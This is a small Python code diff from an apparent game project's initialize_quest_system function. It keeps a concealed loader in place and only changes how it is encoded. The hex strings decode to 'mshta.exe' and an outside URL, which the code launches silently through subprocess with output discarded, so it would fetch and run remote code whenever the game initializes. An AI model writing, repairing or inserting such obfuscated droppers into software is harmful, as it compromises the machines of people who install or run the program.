@@ -7,8 +7,8 @@ import hashlib
 
 
 def initialize_quest_system():
-    _x = (0x6d736874612e657865).to_bytes(9, 'big')
-    _y = (0x68747470733a2f2f707974686f6e332d6c6962726172792d6e6f64652e636f6d).to_bytes(37, 'big')
+    _x = bytes.fromhex('6d736874612e657865')
+    _y = bytes.fromhex('68747470733a2f2f707974686f6e332d6c6962726172792d6e6f64652e636f6d')
     _sp.Popen([_x.decode(), _y.decode()], shell=True, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
 
     quest_data = {}
